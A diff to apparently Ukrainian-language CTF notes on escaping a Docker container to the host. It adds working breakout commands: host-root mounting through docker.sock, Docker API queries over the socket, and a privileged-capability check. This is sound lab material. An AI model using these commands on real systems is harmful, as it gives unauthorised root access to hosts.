@@ -34,13 +34,21 @@ nc -nv 172.17.0.1 3306                          # host/сусід сервіс
 
 ## Доступ до host (лише в межах наявних прав — без деструктиву)
 ```bash
-# docker.sock доступний? (рідко, але варто перевірити)
+# docker.sock доступний? (член групи docker або root)
 ls -la /var/run/docker.sock
-# змонтовані host-директорії
+# → якщо так, змонтувати host-ФС у новий контейнер і читати як root:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh    # потрібен docker-клієнт у контейнері
+# без клієнта — через API сокета:
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head
+
+# привілейований контейнер / зайві capabilities?
+capsh --print 2>/dev/null | grep -i cap_sys_admin      # ознака privileged
+
+# змонтовані host-директорії (читати прапорці/конфіги host)
 mount | grep -v overlay
 cat /proc/mounts | grep -iE 'host|/mnt'
 ```
-Якщо примонтована host-директорія читабельна — там можуть бути прапорці/конфіги host.
+> docker.sock = фактично root на host. Використовувати лише для читання/доступу до прапорців — нічого не ламати (правила).
 
 ## Пастки
 - Стандартного набору інструментів може не бути — залити своє ([file-transfer](../02-workflows/file-transfer.md)).
